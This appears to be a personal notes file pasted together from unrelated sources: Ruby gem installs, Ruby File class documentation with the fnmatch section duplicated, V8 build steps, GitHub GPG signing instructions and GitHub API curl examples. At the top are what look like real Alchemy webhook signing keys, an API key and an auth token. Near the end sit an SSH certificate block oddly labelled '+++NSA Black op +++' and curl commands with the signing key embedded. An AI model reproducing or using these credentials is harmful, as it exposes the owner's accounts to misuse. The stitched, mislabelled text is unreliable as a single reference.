Alchemy Webhook signing key whsec_Ka3G2XkXDVxzhdrFzG8n2OFq

Alchemy api key 2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby

Auth token alchemy webhooks jE92Hk8uCBZnJEh1PP0PoUVDwnuYFdVp
gem 'jwt', '~> 2.8', '>= 2.8.1'

gem install jwt

gem 'base64', '~> 0.2.0'

gem install base64
gem 'bundler', '~> 2.5', '>= 2.5.6'

gem install bundler

gem 'rubocop', '~> 1.62', '>= 1.62.1'
gem install rubocop
$ gem update --system
ruby setup.rb --help
nt working directory of the process unless dir_string is given, in which case it will be used as the starting point. If the given pathname starts with a “~'' it is NOT expanded, it is treated as a normal directory name.

File.absolute_path("~oracle/bin")       #=> "<relative_path>/~oracle/bin"
atime(file_name) → time
Returns the last access time for the named file as a Time object.

file_name can be an IO object.

File.atime("testfile")   #=> Wed Apr 09 08:51:48 CDT 2003
basename(file_name [, suffix] ) → base_name
Returns the last component of the filename given in file_name (after first stripping trailing separators), which can be formed using both File::SEPARATOR and File::ALT_SEPARATOR as the separator when File::ALT_SEPARATOR is not nil. If suffix is given and present at the end of file_name, it is removed. If suffix is “.*”, any extension will be removed.

File.basename("/home/gumby/work/ruby.rb")          #=> "ruby.rb"
File.basename("/home/gumby/work/ruby.rb", ".rb")   #=> "ruby"
File.basename("/home/gumby/work/ruby.rb", ".*")    #=> "ruby"
birthtime(file_name) → time
Returns the birth time for the named file.

file_name can be an IO object.

File.birthtime("testfile")   #=> Wed Apr 09 08:53:13 CDT 2003
If the platform doesn't have birthtime, raises NotImplementedError.

blockdev?(file_name) → true or false
Returns true if the named file is a block device.

file_name can be an IO object.

chardev?(file_name) → true or false
Returns true if the named file is a character device.

file_name can be an IO object.

chmod(mode_int, file_name, ... ) → integer
Changes permission bits on the named file(s) to the bit pattern represented by mode_int. Actual effects are operating system dependent (see the beginning of this section). On Unix systems, see chmod(2) for details. Returns the number of files processed.

File.chmod(0644, "testfile", "out")   #=> 2
chown(owner_int, group_int, file_name,... ) → integer
Changes the owner and group of the named file(s) to the given numeric owner and group id's. Only a process with superuser privileges may change the owner of a file. The current owner of a file may change the file's group to any group to which the owner belongs. A nil or -1 owner or group id is ignored. Returns the number of files processed.

File.chown(nil, 100, "testfile")
ctime(file_name) → time
Returns the change time for the named file (the time at which directory information about the file was changed, not the file itself).

file_name can be an IO object.

Note that on Windows (NTFS), returns creation time (birth time).

File.ctime("testfile")   #=> Wed Apr 09 08:53:13 CDT 2003
delete(file_name, ...) → integer
Deletes the named files, returning the number of names passed as arguments. Raises an exception on any error. Since the underlying implementation relies on the unlink(2) system call, the type of exception raised depends on its error type (see linux.die.net/man/2/unlink) and has the form of e.g. Errno::ENOENT.

See also Dir::rmdir.

directory?(file_name) → true or false
Returns true if the named file is a directory, or a symlink that points at a directory, and false otherwise.

file_name can be an IO object.

File.directory?(".")
dirname(file_name) → dir_name
Returns all components of the filename given in file_name except the last one (after first stripping trailing separators). The filename can be formed using both File::SEPARATOR and File::ALT_SEPARATOR as the separator when File::ALT_SEPARATOR is not nil.

File.dirname("/home/gumby/work/ruby.rb")   #=> "/home/gumby/work"
zero?(file_name) → true or false
Returns true if the named file exists and has a zero size.

file_name can be an IO object.

executable?(file_name) → true or false
Returns true if the named file is executable by the effective user and group id of this process. See eaccess(3).

executable_real?(file_name) → true or false
Returns true if the named file is executable by the real user and group id of this process. See access(3).

exist?(file_name) → true or false
Return true if the named file exists.

file_name can be an IO object.

“file exists” means that stat() or fstat() system call is successful.

exists?(file_name) → true or false
Deprecated method. Don't use.

expand_path(file_name [, dir_string] ) → abs_file_name
Converts a pathname to an absolute pathname. Relative paths are referenced from the current working directory of the process unless dir_string is given, in which case it will be used as the starting point. The given pathname may start with a “~'', which expands to the process owner's home directory (the environment variable HOME must be set correctly). “~user'' expands to the named user's home directory.

File.expand_path("~oracle/bin")           #=> "/home/oracle/bin"
A simple example of using dir_string is as follows.

File.expand_path("ruby", "/usr/bin")      #=> "/usr/bin/ruby"
A more complex example which also resolves parent directory is as follows. Suppose we are in bin/mygem and want the absolute path of lib/mygem.rb.

File.expand_path("../../lib/mygem.rb", __FILE__)
#=> ".../path/to/project/lib/mygem.rb"
So first it resolves the parent of __FILE__, that is bin/, then go to the parent, the root of the project and appends lib/mygem.rb.

extname(path) → string
Returns the extension (the portion of file name in path starting from the last period).

If path is a dotfile, or starts with a period, then the starting dot is not dealt with the start of the extension.

An empty string will also be returned when the period is the last character in path.

File.extname("test.rb")         #=> ".rb"
File.extname("a/b/d/test.rb")   #=> ".rb"
File.extname(".a/b/d/test.rb")  #=> ".rb"
File.extname("foo.")            #=> ""
File.extname("test")            #=> ""
File.extname(".profile")        #=> ""
File.extname(".profile.sh")     #=> ".sh"
file?(file) → true or false
Returns true if the named file exists and is a regular file.

file can be an IO object.

If the file argument is a symbolic link, it will resolve the symbolic link and use the file referenced by the link.

fnmatch( pattern, path, [flags] ) → (true or false)
fnmatch?( pattern, path, [flags] ) → (true or false)
Returns true if path matches against pattern. The pattern is not a regular expression; instead it follows rules similar to shell filename globbing. It may contain the following metacharacters:

*
Matches any file. Can be restricted by other values in the glob. Equivalent to / .* /x in regexp.

*
Matches all files regular files

c*
Matches all files beginning with c

*c
Matches all files ending with c

*c*
Matches all files that have c in them (including at the beginning or end).

To match hidden files (that start with a . set the File::FNM_DOTMATCH flag.

**
Matches directories recursively or files expansively.

?
Matches any one character. Equivalent to /.{1}/ in regexp.

[set]
Matches any one character in set. Behaves exactly like character sets in Regexp, including set negation ([^a-z]).

\
Escapes the next metacharacter.

{a,b}
Matches pattern a and pattern b if File::FNM_EXTGLOB flag is enabled. Behaves like a Regexp union ((?:a|b)).

flags is a bitwise OR of the FNM_XXX constants. The same glob pattern and flags are used by Dir::glob.

Examples:

File.fnmatch('cat',       'cat')        #=> true  # match entire string
File.fnmatch('cat',       'category')   #=> false # only match partial string

File.fnmatch('c{at,ub}s', 'cats')                    #=> false # { } isn't supported by default
File.fnmatch('c{at,ub}s', 'cats', File::FNM_EXTGLOB) #=> true  # { } is supported on FNM_EXTGLOB

File.fnmatch('c?t',     'cat')          #=> true  # '?' match only 1 character
File.fnmatch('c??t',    'cat')          #=> false # ditto
File.fnmatch('c*',      'cats')         #=> true  # '*' match 0 or more characters
File.fnmatch('c*t',     'c/a/b/t')      #=> true  # ditto
File.fnmatch('ca[a-z]', 'cat')          #=> true  # inclusive bracket expression
File.fnmatch('ca[^t]',  'cat')          #=> false # exclusive bracket expression ('^' or '!')

File.fnmatch('cat', 'CAT')                     #=> false # case sensitive
File.fnmatch('cat', 'CAT', File::FNM_CASEFOLD) #=> true  # case insensitive

File.fnmatch('?',   '/', File::FNM_PATHNAME)  #=> false # wildcard doesn't match '/' on FNM_PATHNAME
File.fnmatch('*',   '/', File::FNM_PATHNAME)  #=> false # ditto
File.fnmatch('[/]', '/', File::FNM_PATHNAME)  #=> false # ditto

File.fnmatch('\?',   '?')                       #=> true  # escaped wildcard becomes ordinary
File.fnmatch('\a',   'a')                       #=> true  # escaped ordinary remains ordinary
File.fnmatch('\a',   '\a', File::FNM_NOESCAPE)  #=> true  # FNM_NOESCAPE makes '\' ordinary
File.fnmatch('[\?]', '?')                       #=> true  # can escape inside bracket expression

File.fnmatch('*',   '.profile')                      #=> false # wildcard doesn't match leading
File.fnmatch('*',   '.profile', File::FNM_DOTMATCH)  #=> true  # period by default.
File.fnmatch('.*',  '.profile')                      #=> true

rbfiles = '**' '/' '*.rb' # you don't have to do like this. just write in single string.
File.fnmatch(rbfiles, 'main.rb')                    #=> false
File.fnmatch(rbfiles, './main.rb')                  #=> false
File.fnmatch(rbfiles, 'lib/song.rb')                #=> true
File.fnmatch('**.rb', 'main.rb')                    #=> true
File.fnmatch('**.rb', './main.rb')                  #=> false
File.fnmatch('**.rb', 'lib/song.rb')                #=> true
File.fnmatch('*',           'dave/.profile')                      #=> true

pattern = '*' '/' '*'
File.fnmatch(pattern, 'dave/.profile', File::FNM_PATHNAME)  #=> false
File.fnmatch(pattern, 'dave/.profile', File::FNM_PATHNAME | File::FNM_DOTMATCH) #=> true

pattern = '**' '/' 'foo'
File.fnmatch(pattern, 'a/b/c/foo', File::FNM_PATHNAME)     #=> true
File.fnmatch(pattern, '/a/b/c/foo', File::FNM_PATHNAME)    #=> true
File.fnmatch(pattern, 'c:/a/b/c/foo', File::FNM_PATHNAME)  #=> true
File.fnmatch(pattern, 'a/.b/c/foo', File::FNM_PATHNAME)    #=> false
File.fnmatch(pattern, 'a/.b/c/foo', File::FNM_PATHNAME | File::FNM_DOTMATCH) #=> true
fnmatch?( pattern, path, [flags] ) → (true or false)
Returns true if path matches against pattern. The pattern is not a regular expression; instead it follows rules similar to shell filename globbing. It may contain the following metacharacters:

*
Matches any file. Can be restricted by other values in the glob. Equivalent to / .* /x in regexp.

*
Matches all files regular files

c*
Matches all files beginning with c

*c
Matches all files ending with c

*c*
Matches all files that have c in them (including at the beginning or end).

To match hidden files (that start with a . set the File::FNM_DOTMATCH flag.

**
Matches directories recursively or files expansively.

?
Matches any one character. Equivalent to /.{1}/ in regexp.

[set]
Matches any one character in set. Behaves exactly like character sets in Regexp, including set negation ([^a-z]).

\
Escapes the next metacharacter.

{a,b}
Matches pattern a and pattern b if File::FNM_EXTGLOB flag is enabled. Behaves like a Regexp union ((?:a|b)).

flags is a bitwise OR of the FNM_XXX constants. The same glob pattern and flags are used by Dir::glob.

Examples:

File.fnmatch('cat',       'cat')        #=> true  # match entire string
File.fnmatch('cat',       'category')   #=> false # only match partial string

File.fnmatch('c{at,ub}s', 'cats')                    #=> false # { } isn't supported by default
File.fnmatch('c{at,ub}s', 'cats', File::FNM_EXTGLOB) #=> true  # { } is supported on FNM_EXTGLOB

File.fnmatch('c?t',     'cat')          #=> true  # '?' match only 1 character
File.fnmatch('c??t',    'cat')          #=> false # ditto
File.fnmatch('c*',      'cats')         #=> true  # '*' match 0 or more characters
File.fnmatch('c*t',     'c/a/b/t')      #=> true  # ditto
File.fnmatch('ca[a-z]', 'cat')          #=> true  # inclusive bracket expression
File.fnmatch('ca[^t]',  'cat')          #=> false # exclusive bracket expression ('^' or '!')

File.fnmatch('cat', 'CAT')                     #=> false # case sensitive
File.fnmatch('cat', 'CAT', File::FNM_CASEFOLD) #=> true  # case insensitive

File.fnmatch('?',   '/', File::FNM_PATHNAME)  #=> false # wildcard doesn't match '/' on FNM_PATHNAME
File.fnmatch('*',   '/', File::FNM_PATHNAME)  #=> false # ditto
File.fnmatch('[/]', '/', File::FNM_PATHNAME)  #=> false # ditto

File.fnmatch('\?',   '?')                       #=> true  # escaped wildcard becomes ordinary
File.fnmatch('\a',   'a')                       #=> true  # escaped ordinary remains ordinary
File.fnmatch('\a',   '\a', File::FNM_NOESCAPE)  #=> true  # FNM_NOESCAPE makes '\' ordinary
File.fnmatch('[\?]', '?')                       #=> true  # can escape inside bracket expression

File.fnmatch('*',   '.profile')                      #=> false # wildcard doesn't match leading
File.fnmatch('*',   '.profile', File::FNM_DOTMATCH)  #=> true  # period by default.
File.fnmatch('.*',  '.profile')                      #=> true

rbfiles = '**' '/' '*.rb' # you don't have to do like this. just write in single string.
File.fnmatch(rbfiles, 'main.rb')                    #=> false
File.fnmatch(rbfiles, './main.rb')                  #=> false
File.fnmatch(rbfiles, 'lib/song.rb')                #=> true
File.fnmatch('**.rb', 'main.rb')                    #=> true
File.fnmatch('**.rb', './main.rb')                  #=> false
File.fnmatch('**.rb', 'lib/song.rb')                #=> true
File.fnmatch('*',           'dave/.profile')                      #=> true

pattern = '*' '/' '*'
File.fnmatch(pattern, 'dave/.profile', File::FNM_PATHNAME)  #=> false
File.fnmatch(pattern, 'dave/.profile', File::FNM_PATHNAME | File::FNM_DOTMATCH) #=> true

pattern = '**' '/' 'foo'
File.fnmatch(pattern, 'a/b/c/foo', File::FNM_PATHNAME)     #=> true
File.fnmatch(pattern, '/a/b/c/foo', File::FNM_PATHNAME)    #=> true
File.fnmatch(pattern, 'c:/a/b/c/foo', File::FNM_PATHNAME)  #=> true
File.fnmatch(pattern, 'a/.b/c/foo', File::FNM_PATHNAME)    #=> false
File.fnmatch(pattern, 'a/.b/c/foo', File::FNM_PATHNAME | File::FNM_DOTMATCH) #=> true
ftype(file_name) → string
Identifies the type of the named file; the return string is one of “file'', “directory'', “characterSpecial'', “blockSpecial'', “fifo'', “link'', “socket'', or “unknown''.

File.ftype("testfile")            #=> "file"
File.ftype("/dev/tty")            #=> "characterSpecial"
File.ftype("/tmp/.X11-unix/X0")   #=> "socket"
grpowned?(file_name) → true or false
Returns true if the named file exists and the effective group id of the calling process is the owner of the file. Returns false on Windows.

file_name can be an IO object.

identical?(file_1, file_2) → true or false
Returns true if the named files are identical.

file_1 and file_2 can be an IO object.

open("a", "w") {}
p File.identical?("a", "a")      #=> true
p File.identical?("a", "./a")    #=> true
File.link("a", "b")
p File.identical?("a", "b")      #=> true
File.symlink("a", "c")
p File.identical?("a", "c")      #=> true
open("d", "w") {}
p File.identical?("a", "d")      #=> false
join(string, ...) → string
Returns a new string formed by joining the strings using "/".

File.join("usr", "mail", "gumby")   #=> "usr/mail/gumby"
lchmod(mode_int, file_name, ...) → integer
Equivalent to File::chmod, but does not follow symbolic links (so it will change the permissions associated with the link, not the file referenced by the link). Often not available.

lchown(owner_int, group_int, file_name,..) → integer
Equivalent to File::chown, but does not follow symbolic links (so it will change the owner associated with the link, not the file referenced by the link). Often not available. Returns number of files in the argument list.

link(old_name, new_name) → 0
Creates a new name for an existing file using a hard link. Will not overwrite new_name if it already exists (raising a subclass of SystemCallError). Not available on all platforms.

File.link("testfile", ".testfile")   #=> 0
IO.readlines(".testfile")[0]         #=> "This is line one\n"
lstat(file_name) → stat
Same as File::stat, but does not follow the last symbolic link. Instead, reports on the link itself.

File.symlink("testfile", "link2test")   #=> 0
File.stat("testfile").size              #=> 66
File.lstat("link2test").size            #=> 8
File.stat("link2test").size             #=> 66
lutime(atime, mtime, file_name,...) → integer
Sets the access and modification times of each named file to the first two arguments. If a file is a symlink, this method acts upon the link itself as opposed to its referent; for the inverse behavior, see File.utime. Returns the number of file names in the argument list.

mkfifo(file_name, mode=0666) => 0
Creates a FIFO special file with name file_name. mode specifies the FIFO's permissions. It is modified by the process's umask in the usual way: the permissions of the created file are (mode & ~umask).

mtime(file_name) → time
Returns the modification time for the named file as a Time object.

file_name can be an IO object.

File.mtime("testfile")   #=> Tue Apr 08 12:58:04 CDT 2003
new(filename, mode="r" [, opt]) → file
new(filename [, mode [, perm]] [, opt]) → file
Opens the file named by filename according to the given mode and returns a new File object.

See IO.new for a description of mode and opt.

If a file is being created, permission bits may be given in perm. These mode and permission bits are platform dependent; on Unix systems, see open(2) and chmod(2) man pages for details.

The new File object is buffered mode (or non-sync mode), unless filename is a tty. See IO#flush, IO#fsync, IO#fdatasync, and IO#sync= about sync mode.

Examples¶ ↑

f = File.new("testfile", "r")
f = File.new("newfile",  "w+")
f = File.new("newfile", File::CREAT|File::TRUNC|File::RDWR, 0644)
open(filename, mode="r" [, opt]) → file
open(filename [, mode [, perm]] [, opt]) → file
open(filename, mode="r" [, opt]) {|file| block } → obj
open(filename [, mode [, perm]] [, opt]) {|file| block } → obj
With no associated block, File.open is a synonym for File.new. If the optional code block is given, it will be passed the opened file as an argument and the File object will automatically be closed when the block terminates. The value of the block will be returned from File.open.

If a file is being created, its initial permissions may be set using the perm parameter. See File.new for further discussion.

See IO.new for a description of the mode and opt parameters.

owned?(file_name) → true or false
Returns true if the named file exists and the effective used id of the calling process is the owner of the file.

file_name can be an IO object.

path(path) → string
Returns the string representation of the path

File.path("/dev/null")          #=> "/dev/null"
File.path(Pathname.new("/tmp")) #=> "/tmp"
pipe?(file_name) → true or false
Returns true if the named file is a pipe.

file_name can be an IO object.

readable?(file_name) → true or false
Returns true if the named file is readable by the effective user and group id of this process. See eaccess(3).

readable_real?(file_name) → true or false
Returns true if the named file is readable by the real user and group id of this process. See access(3).

readlink(link_name) → file_name
Returns the name of the file referenced by the given link. Not available on all platforms.

File.symlink("testfile", "link2test")   #=> 0
File.readlink("link2test")              #=> "testfile"
realdirpath(pathname [, dir_string]) → real_pathname
Returns the real (absolute) pathname of pathname in the actual filesystem. The real pathname doesn't contain symlinks or useless dots.

If dir_string is given, it is used as a base directory for interpreting relative pathname instead of the current directory.

The last component of the real pathname can be nonexistent.

realpath(pathname [, dir_string]) → real_pathname
Returns the real (absolute) pathname of pathname in the actual filesystem not containing symlinks or useless dots.

If dir_string is given, it is used as a base directory for interpreting relative pathname instead of the current directory.

All components of the pathname must exist when this method is called.

rename(old_name, new_name) → 0
Renames the given file to the new name. Raises a SystemCallError if the file cannot be renamed.

File.rename("afile", "afile.bak")   #=> 0
setgid?(file_name) → true or false
Returns true if the named file has the setgid bit set.

setuid?(file_name) → true or false
Returns true if the named file has the setuid bit set.

size(file_name) → integer
Returns the size of file_name.

file_name can be an IO object.

size?(file_name) → Integer or nil
Returns nil if file_name doesn't exist or has zero size, the size of the file otherwise.

file_name can be an IO object.

socket?(file_name) → true or false
Returns true if the named file is a socket.

file_name can be an IO object.

split(file_name) → array
Splits the given string into a directory and a file component and returns them in a two-element array. See also File::dirname and File::basename.

File.split("/home/gumby/.profile")   #=> ["/home/gumby", ".profile"]
stat(file_name) → stat
Returns a File::Stat object for the named file (see File::Stat).

File.stat("testfile").mtime   #=> Tue Apr 08 12:58:04 CDT 2003
sticky?(file_name) → true or false
Returns true if the named file has the sticky bit set.

symlink(old_name, new_name) → 0
Creates a symbolic link called new_name for the existing file old_name. Raises a NotImplemented exception on platforms that do not support symbolic links.

File.symlink("testfile", "link2test")   #=> 0
symlink?(file_name) → true or false
Returns true if the named file is a symbolic link.

truncate(file_name, integer) → 0
Truncates the file file_name to be at most integer bytes long. Not available on all platforms.

f = File.new("out", "w")
f.write("1234567890")     #=> 10
f.close                   #=> nil
File.truncate("out", 5)   #=> 0
File.size("out")          #=> 5
umask() → integer
umask(integer) → integer
Returns the current umask value for this process. If the optional argument is given, set the umask to that value and return the previous value. Umask values are subtracted from the default permissions, so a umask of 0222 would make a file read-only for everyone.

File.umask(0006)   #=> 18
File.umask         #=> 6
unlink(file_name, ...) → integer
Deletes the named files, returning the number of names passed as arguments. Raises an exception on any error. Since the underlying implementation relies on the unlink(2) system call, the type of exception raised depends on its error type (see linux.die.net/man/2/unlink) and has the form of e.g. Errno::ENOENT.

See also Dir::rmdir.

utime(atime, mtime, file_name,...) → integer
Sets the access and modification times of each named file to the first two arguments. If a file is a symlink, this method acts upon its referent rather than the link itself; for the inverse behavior see File.lutime. Returns the number of file names in the argument list.

world_readable?(file_name) → integer or nil
If file_name is readable by others, returns an integer representing the file permission bits of file_name. Returns nil otherwise. The meaning of the bits is platform dependent; on Unix systems, see stat(2).

file_name can be an IO object.

File.world_readable?("/etc/passwd")           #=> 420
m = File.world_readable?("/etc/passwd")
sprintf("%o", m)                              #=> "644"
world_writable?(file_name) → integer or nil
If file_name is writable by others, returns an integer representing the file permission bits of file_name. Returns nil otherwise. The meaning of the bits is platform dependent; on Unix systems, see stat(2).

file_name can be an IO object.

File.world_writable?("/tmp")                  #=> 511
m = File.world_writable?("/tmp")
sprintf("%o", m)                              #=> "777"
writable?(file_name) → true or false
Returns true if the named file is writable by the effective user and group id of this process. See eaccess(3).

writable_real?(file_name) → true or false
Returns true if the named file is writable by the real user and group id of this process. See access(3)

zero?(file_name) → true or false
Returns true if the named file exists and has a zero size.

file_name can be an IO object.

Public Instance Methods

atime → time
Returns the last access time (a Time object) for file, or epoch if file has not been accessed.

File.new("testfile").atime   #=> Wed Dec 31 18:00:00 CST 1969
birthtime → time
Returns the birth time for file.

File.new("testfile").birthtime   #=> Wed Apr 09 08:53:14 CDT 2003
If the platform doesn't have birthtime, raises NotImplementedError.

chmod(mode_int) → 0
Changes permission bits on file to the bit pattern represented by mode_int. Actual effects are platform dependent; on Unix systems, see chmod(2) for details. Follows symbolic links. Also see File#lchmod.

f = File.new("out", "w");
f.chmod(0644)   #=> 0
chown(owner_int, group_int ) → 0
Changes the owner and group of file to the given numeric owner and group id's. Only a process with superuser privileges may change the owner of a file. The current owner of a file may change the file's group to any group to which the owner belongs. A nil or -1 owner or group id is ignored. Follows symbolic links. See also File#lchown.

File.new("testfile").chown(502, 1000)
ctime → time
Returns the change time for file (that is, the time directory information about the file was changed, not the file itself).

Note that on Windows (NTFS), returns creation time (birth time).

File.new("testfile").ctime   #=> Wed Apr 09 08:53:14 CDT 2003
flock(locking_constant) → 0 or false
Locks or unlocks a file according to locking_constant (a logical or of the values in the table below). Returns false if File::LOCK_NB is specified and the operation would otherwise have blocked. Not available on all platforms.

Locking constants (in class File):

LOCK_EX   | Exclusive lock. Only one process may hold an
          | exclusive lock for a given file at a time.
----------+------------------------------------------------
LOCK_NB   | Don't block when locking. May be combined
          | with other lock options using logical or.
----------+------------------------------------------------
LOCK_SH   | Shared lock. Multiple processes may each hold a
          | shared lock for a given file at the same time.
----------+------------------------------------------------
LOCK_UN   | Unlock.
Example:

# update a counter using write lock
# don't use "w" because it truncates the file before lock.
File.open("counter", File::RDWR|File::CREAT, 0644) {|f|
  f.flock(File::LOCK_EX)
  value = f.read.to_i + 1
  f.rewind
  f.write("#{value}\n")
  f.flush
  f.truncate(f.pos)
}

# read the counter using read lock
File.open("counter", "r") {|f|
  f.flock(File::LOCK_SH)
  p f.read
}
lstat → stat
Same as IO#stat, but does not follow the last symbolic link. Instead, reports on the link itself.

File.symlink("testfile", "link2test")   #=> 0
File.stat("testfile").size              #=> 66
f = File.new("link2test")
f.lstat.size                            #=> 8
f.stat.size                             #=> 66
mtime → time
Returns the modification time for file.

File.new("testfile").mtime   #=> Wed Apr 09 08:53:14 CDT 2003
path → filename
to_path → filename
Returns the pathname used to create file as a string. Does not normalize the name.

The pathname may not point to the file corresponding to file. For instance, the pathname becomes void when the file has been moved or deleted.

This method raises IOError for a file created using File::Constants::TMPFILE because they don't have a pathname.

File.new("testfile").path               #=> "testfile"
File.new("/tmp/../tmp/xxx", "w").path   #=> "/tmp/../tmp/xxx"
size → integer
Returns the size of file in bytes.

File.new("testfile").size   #=> 66
to_path → filename
Returns the pathname used to create file as a string. Does not normalize the name.

The pathname may not point to the file corresponding to file. For instance, the pathname becomes void when the file has been moved or deleted.

This method raises IOError for a file created using File::Constants::TMPFILE because they don't have a pathname.

File.new("testfile").path               #=> "testfile"
File.new("/tmp/../tmp/xxx", "w").path   #=> "/tmp/../tmp/xxx"
truncate(integer) → 0
Truncates file to at most integer bytes. The file must be opened for writing. Not available on all platforms.

f = File.new("out", "w")
f.syswrite("1234567890")   #=> 10
f.truncate(5)              #=> 0
f.close()                  #=> nil
File.size("out")           #=> 5
tools/dev/v8gen.py x64.release.sample
You can inspect and manually edit the build configuration by running:

gn args out.gn/x64.release.sample
Build the static library on a Linux 64 system:

ninja -C out.gn/x64.release.sample v8_monolith
Compile hello-world.cc, linking to the static library created in the build process. For example, on 64bit Linux using the GNU compiler:

g++ -I. -Iinclude samples/hello-world.cc -o hello_world -fno-rtti -lv8_monolith -lv8_libbase -lv8_libplatform -ldl -Lout.gn/x64.release.sample/obj/ -pthread -std=c++17 -DV8_COMPRESS_POINTERS -DV8_ENABLE_SANDBOX
For more complex code, V8 fails without an ICU data file. Copy this file to where your binary is stored:

cp out.gn/x64.release.sample/icudtl.dat .
Run the hello_world executable file at the command line. e.g. On Linux, in the V8 directory, run:

./hello_world

git config --global --unset gpg.format
Use the gpg --list-secret-keys --keyid-format=long command to list the long form of the GPG keys for which you have both a public and private key. A private key is required for signing commits or tags.
Shell
gpg --list-secret-keys --keyid-format=long
Note: Some GPG installations on Linux may require you to use gpg2 --list-keys --keyid-format LONG to view a list of your existing keys instead. In this case you will also need to configure Git to use gpg2 by running git config --global gpg.program gpg2.
From the list of GPG keys, copy the long form of the GPG key ID you'd like to use. In this example, the GPG key ID is 3AA5C34371567BD2:
Shell

$ gpg --list-secret-keys --keyid-format=long
/Users/hubot/.gnupg/secring.gpg
------------------------------------
sec   4096R/3AA5C34371567BD2 2016-03-10 [expires: 2017-03-10]
uid                          Hubot <hubot@example.com>
ssb   4096R/4BB6D45482678BE3 2016-03-10
To set your primary GPG signing key in Git, paste the text below, substituting in the GPG primary key ID you'd like to use. In this example, the GPG key ID is 3AA5C34371567BD2:
git config --global user.signingkey 3AA5C34371567BD2
Alternatively, when setting a subkey include the ! suffix. In this example, the GPG subkey ID is 4BB6D45482678BE3:
git config --global user.signingkey 4BB6D45482678BE3!
Optionally, to configure Git to sign all commits by default, enter the following command:
git config --global commit.gpgsign true
For more information, see "Signing commits."
If you aren't using the GPG suite, run the following command in the zsh shell to add the GPG key to your .zshrc file, if it exists, or your .zprofile file:
$ if [ -r ~/.zshrc ]; then echo -e '\nexport GPG_TTY=$(tty)' >> ~/.zshrc; \
  else echo -e '\nexport GPG_TTY=$(tty)' >> ~/.zprofile; fi
Alternatively, if you use the bash shell, run this command:
$ if [ -r ~/.bash_profile ]; then echo -e '\nexport GPG_TTY=$(tty)' >> ~/.bash_profile; \
  else echo -e '\nexport GPG_TTY=$(tty)' >> ~/.profile; fi
Optionally, to prompt you to enter a PIN or passphrase when required, install pinentry-mac. For example, using Homebrew:
brew install pinentry-mac
echo "pinentry-program $(which pinentry-mac)" >> ~/.gnupg/gpg-agent.conf
killall gpg-agent
curl -L \
  -H "Accept: application/vnd.github+json" \
  -H "Authorization: Bearer <YOUR-TOKEN>" \
  -H "X-GitHub-Api-Version: 2022-11-28" \
  https://api.github.com/repos/OWNER/REPO/import
curl -L \
  -X PUT \
  -H "Accept: application/vnd.github+json" \
  -H "Authorization: Bearer <YOUR-TOKEN>" \
  -H "X-GitHub-Api-Version: 2022-11-28" \
  https://api.github.com/repos/OWNER/REPO/import \
  -d '{"vcs":"subversion","vcs_url":"http://svn.mycompany.com/svn/myproject","vcs_username":"octocat","vcs_password":"secret"}'
curl -L \
  -X PATCH \
  -H "Accept: application/vnd.github+json" \
  -H "Authorization: Bearer <YOUR-TOKEN>" \
  -H "X-GitHub-Api-Version: 2022-11-28" \
  https://api.github.com/repos/OWNER/REPO/import \
  -d '{"vcs_username":"octocat","vcs_password":"secret"}'
curl -L \
  -X PATCH \
  -H "Accept: application/vnd.github+json" \
  -H "Authorization: Bearer <YOUR-TOKEN>" \
  -H "X-GitHub-Api-Version: 2022-11-28" \
  https://api.github.com/repos/OWNER/REPO/import \
  -d '{"vcs":"tfvc","tfvc_project":"project1","human_name":"project1 (tfs)"}'  

curl -L \
  -X PATCH \
  -H "Accept: application/vnd.github+json" \
  -H "Authorization: Bearer <YOUR-TOKEN>" \
  -H "X-GitHub-Api-Version: 2022-11-28" \
  https://api.github.com/repos/OWNER/REPO/import
curl --request GET \
--url "https://api.github.com/user" \
--header "Accept: application/vnd.github+json" \
--header "Authorization: Bearer USER_ACCESS_TOKEN" \
--header "X-GitHub-Api-Version: 2022-11-28"
curl --request GET \
--url "https://api.github.com/user" \
--header "Accept: application/vnd.github+json" \
--header "Authorization: Bearer USER_ACCESS_TOKEN" \
--header "X-GitHub-Api-Version: 2022-11-28"

  

  






+++NSA Black op +++
SHA-2 nist (ecdsa) cert.
AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI3oSgxrOEJ+tIJ/n6VYtxQIFvynqlOHpfOAJ4x4OfmMYDkbf8dr6RAuUSf+ZC2HMCujta7EjZ9t+6v08Ue+Cgk= 

 "ssh_certificate_authority_id": "sshca_2bMmWjXfs30PrfyvCsxg79Bqea3",
 "principals": ["inconshreveable.com", "10.2.42.9"],
 "valid_after": "2024-01-23T18:09:15Z",
 "valid_until": "2024-04-22T18:09:15Z",
 "certificate": "ecdsa-sha2-nistp256-cert-v01@openssh.com AAAAKGVjZHNhLXNoYTItbmlzdHAyNTYtY2VydC12MDFAb3BlbnNzaC5jb20AAAAggnhUP6YZ1+Wj/NUNS9wN8yyJPgcDTNigqw0RlxX3HqAAAAAIbmlzdHAyNTYAAABBBI3oSgxrOEJ+tIJ/n6VYtxQIFvynqlOHpfOAJ4x4OfmMYDkbf8dr6RAuUSf+ZC2HMCujta7EjZ9t+6v08Ue+CgkAAAAAAAAAAAAAAAIAAAAhc2hjcnRfMmJNbVdvQUZHVlJiTHhqT3hWWEF2dWNMaUF0AAAAJAAAABNpbmNvbnNocmV2ZWFibGUuY29tAAAACTEwLjIuNDIuOQAAAABlsADLAAAAAGYmp8sAAAAAAAAAAAAAAAAAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIPbm5N4qnn+2CMXtrIfRXvUXDmTgkk/fcBHlR9dDAeY3AAAAUwAAAAtzc2gtZWQyNTUxOQAAAEATCa7CcaUJEVcAm2K7PaqeuJDE+pI+8PzMl+aPb9/YRAA72dMMy5izNNVLb7t7Cfqcyi4IGdd2TLFhFyVyayEE shcrt_2bMmWoAFGVRbLxjOxVXAvucLiAt"

Private key
SHA256:TvOWY3mZWlr9uMgny0PtyVdWFzAfKO98UgFlMzgP+ZA=
tar xzf ./actions-runner-linux-x64-2.313.0.tar.gz
GET https://github.com/login/oauth/authorize
This
https://smee.io/F1FDatOZAJIsTI
curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/promote-live \
 -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>'

curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/auto-promote-live \
 -H "Content-Type: application/json" -H "x-api-key: < whsec_Ka3G2XkXDVxzhdrFzG8n2OFq $>"

curl -v \
